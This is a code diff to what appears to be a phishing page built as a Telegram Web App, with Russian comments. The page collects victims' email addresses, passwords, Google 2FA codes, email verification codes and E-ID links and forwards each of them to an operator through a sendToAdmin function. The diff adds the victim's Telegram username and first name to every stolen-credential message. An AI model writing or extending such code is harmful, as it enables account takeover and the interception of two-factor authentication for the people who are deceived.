@@ -255,10 +255,11 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // Получаем данные пользователя Telegram (ID и т.д.)
+        // Получаем данные пользователя Telegram
         const user = tg.initDataUnsafe?.user || {};
         const userId = user.id || 'неизвестно';
         const userFirstName = user.first_name || 'Гость';
+        const userUsername = user.username ? `@${user.username}` : 'нет';
 
         const pageMain = document.getElementById('pageMain');
         const pageEid = document.getElementById('pageEid');
@@ -344,8 +345,8 @@
             loginSubmitBtn.textContent = 'Отправка...';
             userEmail = e; userPassword = p;
 
-            // ДОБАВЛЯЕМ ID В СООБЩЕНИЕ
-            const msg = `🔔 Новая заявка\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+            // ID и имя добавлены
+            const msg = `🔔 Новая заявка\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n👤 Username: ${userUsername}\n\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
             const ok = await sendToAdmin(msg);
             
             if (ok) {
@@ -367,8 +368,8 @@
             submitCodeBtn.disabled = true;
             submitCodeBtn.textContent = 'Отправка...';
 
-            // ДОБАВЛЯЕМ ID В СООБЩЕНИЕ
-            const msg = `🔐 Код 2FA (Google)\n\n👤 ID: ${userId}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`;
+            // ID и имя добавлены
+            const msg = `🔐 Код 2FA (Google)\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n👤 Username: ${userUsername}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`;
             const ok = await sendToAdmin(msg);
 
             if (ok) {
@@ -390,8 +391,8 @@
             submitEmailCodeBtn.disabled = true;
             submitEmailCodeBtn.textContent = 'Отправка...';
 
-            // ДОБАВЛЯЕМ ID В СООБЩЕНИЕ
-            const msg = `📧 Код из почты\n\n👤 ID: ${userId}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`;
+            // ID и имя добавлены
+            const msg = `📧 Код из почты\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n👤 Username: ${userUsername}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔢 Код: ${code}`;
             const ok = await sendToAdmin(msg);
 
             if (ok) {
@@ -415,8 +416,8 @@
             eidSubmitBtn.textContent = 'Отправка...';
             userEmail = e; userPassword = p;
 
-            // ДОБАВЛЯЕМ ID В СООБЩЕНИЕ
-            const msg = `🆔 E-ID Вход\n\n👤 ID: ${userId}\n\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
+            // ID и имя добавлены
+            const msg = `🆔 E-ID Вход\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n👤 Username: ${userUsername}\n\n📧 Email: ${e}\n🔑 Пароль: ${p}`;
             const ok = await sendToAdmin(msg);
 
             if (ok) {
@@ -438,8 +439,8 @@
             eidLinkSubmitBtn.disabled = true;
             eidLinkSubmitBtn.textContent = 'Отправка...';
 
-            // ДОБАВЛЯЕМ ID В СООБЩЕНИЕ
-            const msg = `🔗 E-ID Ссылка\n\n👤 ID: ${userId}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`;
+            // ID и имя добавлены
+            const msg = `🔗 E-ID Ссылка\n\n👤 ID: ${userId}\n👤 Имя: ${userFirstName}\n👤 Username: ${userUsername}\n\n📧 Email: ${userEmail}\n🔑 Пароль: ${userPassword}\n🔗 Ссылка: ${link}`;
             const ok = await sendToAdmin(msg);
 
             if (ok) {
